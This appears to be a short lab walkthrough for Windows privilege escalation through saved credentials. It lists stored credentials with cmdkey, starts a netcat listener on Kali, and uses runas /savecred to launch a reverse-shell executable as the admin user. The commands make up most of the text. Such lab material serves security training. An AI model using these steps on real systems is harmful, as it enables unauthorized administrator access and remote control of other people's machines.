
---

### 🔍 **Step 1: Check for Saved Credentials**

```bash
cmdkey /list
```

- **What it does:** Lists stored credentials for different services or users on the system.
    
- **What to look for:** A line like:
    
    ```
    Target: DOMAIN\admin
    ```
    

> 💡 If no credentials are saved, run the provided script:

```bash
C:\PrivEsc\savecred.bat
```

This stores the admin credentials using `runas /savecred` so they can be reused without prompting.

---

### 🎧 **Step 2: Start Listener on Kali**

```bash
nc -lvnp 4444
```

- **Why:** Prepares Kali to receive the reverse shell.
    
- Make sure `reverse.exe` is set to connect to this IP and port.
    

---

### 🚀 **Step 3: Run the Reverse Shell with Saved Admin Credentials**

```bash
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

- **What it does:** Launches `reverse.exe` as the `admin` user using the saved credentials.
    
- ✅ If successful, this gives you a **reverse shell running with admin privileges**.
    

---
